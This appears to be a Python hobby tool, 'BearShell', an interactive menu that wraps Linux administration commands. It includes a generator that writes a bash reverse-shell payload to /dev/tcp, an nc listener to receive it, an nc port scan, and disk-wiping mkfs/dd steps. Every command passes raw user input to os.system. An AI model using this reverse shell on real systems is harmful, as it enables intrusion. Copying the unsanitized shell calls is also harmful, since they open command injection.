import os
import time
import colorama
from colorama import Fore
import random

def funtion_banner():
	os.system("python3 banner")
def clear_windows():
	os.system("clear")
def full():
	clear_windows()
	funtion_banner()
	print(random_ran)
random_ran = (random.choice(["it is recommended to run this tool \nas root user to avoid errors", "This tool is written in python3", "Did you know BearShell?", "This tool will be updated once a month"]))
random_color = (random.choice([Fore.RED, Fore.GREEN, Fore.BLUE, Fore.WHITE, Fore.YELLOW]))

full()
while True:

	#principal comands
	principal_user = input(Fore.RED + "\nbrs> ")
	if principal_user == "generate reverse shell tcp linux":
		ip_a = input(Fore.GREEN + "LHOST: ")
		port_a = input(Fore.GREEN + "LPORT: ")
		rute_a = input("write the rute: ")
		file = open(f"{rute_a}", "w")
		file.write(f"bash -i >& /dev/tcp/{ip_a}/{port_a} 0>&1" + os.linesep)
		file.close()
	
	elif principal_user == "start listening port":
		listening_port = input("LPORT: ")
		try:
			print(Fore.YELLOW + "starting connection...")
			os.system(f"nc -lvp {listening_port}")
		except:
			print(Fore.RED + "Connection refused")
	
	elif principal_user == "pwd":
		print("current route: " + os.getcwd())
	
	elif principal_user == "cd":
		rute_b = input(Fore.GREEN + "rute> ")
		os.chdir(rute_b)
	
	elif principal_user == "dir":
		rute_c = input(Fore.GREEN + "rute> ")
		os.chdir(rute_c)
		print(os.listdir(os.getcwd()))

	elif principal_user == "network processes":
		os.system("netstat -tanp")

	elif principal_user == "principal processes":
		os.system("ps -la")

	elif principal_user == "full processes":
		os.system("ps -aux")
	elif principal_user == "firefox":
		os.system("firefox")
	elif principal_user == "clear":
		os.system("clear")
	elif principal_user == "banner":
		clear_windows()
		funtion_banner()
		print(random_ran)
	elif principal_user == "camera":
		os.system("cheese")
	elif principal_user == "mydisks":
		os.system("lsblk")
	elif principal_user == "connect by ssh":
		user_user = input(Fore.GREEN + "Write the user: ")
		ip_ip = input(Fore.GREEN + "Write the IP address: ")
		port_port = input("write the port: ")
		os.system(f"ssh -l {user_user} {ip_ip} -p {port_port}")
	elif principal_user == "connect ssh grafical":
		user_user_a = input(Fore.GREEN + "write the user: ")
		ip_ip_a = input(Fore.GREEN + "write the IP address: ")
		port_port_a = input(Fore.GREEN + "write the port: ")
		os.system(f"ssh -X {user_user_a}@{ip_ip_a} -p {port_port_a}")
	elif principal_user == "install":
		program_name = input(Fore.GREEN + "Write the name of the program: ")
		os.system(f"sudo apt -y install {program_name}")
	elif principal_user == "up disk":
		disk_a = input("Write the name of the disk to umount: ")
		os.system(f"mount -t vfat {disk_a}")
	elif principal_user == "down disk":
		disk_b = input("Write the name of the disk to umount: ")
		os.system(f"umount {disk_b}")
	elif principal_user == "boot usb":
		boot_a = input("Enter the disk name: ")
		boot_b = input("Enter the path of the iso image: ")
		os.system(f"mkfs.vfat -F 32 {boot_a} -I")
		os.system(f"dd if={boot_b} of={boot_a}")
	elif principal_user == "view dpkg":
		os.system("dpkg --list")
	elif principal_user == "ssh config":
		print("[1] start ssh server \n[2] Reboot ssh server \n[3] Stop ssh server \n[0] EXIT")
		ssh_config = int(input("===> "))
		if ssh_config == 1:
			os.system("service ssh start")
		elif ssh_config == 2:
			os.system("service ssh reboot")
		elif ssh_config == 3:
			os.system("service ssh stop")
		elif ssh_config == 0:
			print(".")
		else:
			print("error-error-error")
	elif principal_user == "port scan":
		scan_a = input(Fore.GREEN + "write the IP Address: ")
		scan_b = input(Fore.GREEN + "write the port: ")
		os.system(f"nc -v -z {scan_a} {scan_b}")
	elif principal_user == "pn":
		pn_a = input("write the IP Address or site: ")
		pn_b = input("> ")
		os.system(f"ping -c {pn_b} {pn_a}")
	elif principal_user == "help":
		os.system("more .h")
	elif principal_user == "config ip":
		os.system("ifconfig")
	elif principal_user == "kill":
		kill_a = input("Write the process number: ")
		os.system(f"kill -9 {kill_a}")
	elif principal_user == "pkill":
		pkill_a = input("Write the processes: ")
		os.system(f"pkill {pkill_a}")
	elif principal_user == "editor":
		editor_a = input("Write the name and extension of your file: ")
		os.system(f"subl {editor_a}")
	elif principal_user == "network up":
		net_a = input("Write the name of the network card: ")
		os.system(f"ifconfig {net_a}")
	elif principal_user == "network down":
		net_b = input("Write the name of the network card: ")
		os.system(f"ifconfig {net_b} down")
	elif principal_user == "git":
		url_a = input("Write the url: ")
		os.system(f"git clone {url_a}")
	elif principal_user == "download":
		url_b = input("Write the url: ")
		os.system(f"wget -i {url_b}")
	elif principal_user == "my ip address":
		os.system("curl ifconfig.me")
	elif principal_user == "route":
		os.system(f"route -n")
	elif principal_user == "update":
		os.system("apt update -y")
	elif principal_user == "run program":
		run_a =  input(Fore.YELLOW + "write the tongue and the file path: ")
		os.system(f"{run_a}")
	elif principal_user == "send file by ssh":
		rute_rute_a = input(Fore.GREEN + "write the path client: ")
		rute_rute_b = input(Fore.YELLOW + "write the path host server: ")
		user_path = input(Fore.GREEN + "write the user: ")
		ip_path = input(Fore.GREEN + "write the IP Address: ")
		os.system(f"scp {rute_rute_a} {user_path}@{ip_path}:{rute_rute_b}")
	elif principal_user == "BearShell":
		list_BearShell = ["Created by crypto453", "Language used: Python 3.9.2", "version 1.0"]
		for list_b in list_BearShell:
			print(random_color + Fore.YELLOW + list_b)
			time.sleep(1)
	elif principal_user == "":
		os.system("")
	elif principal_user == "purge":
		purge_a = input(Fore.GREEN + "write the name of the package to remove: ")
		os.system(f"apt -y --purge autoremove {purge_a}")
	elif principal_user == "python console":
		os.system("python3")


	elif principal_user == "close":
		break
	else:
		print(Fore.YELLOW + "command not fount")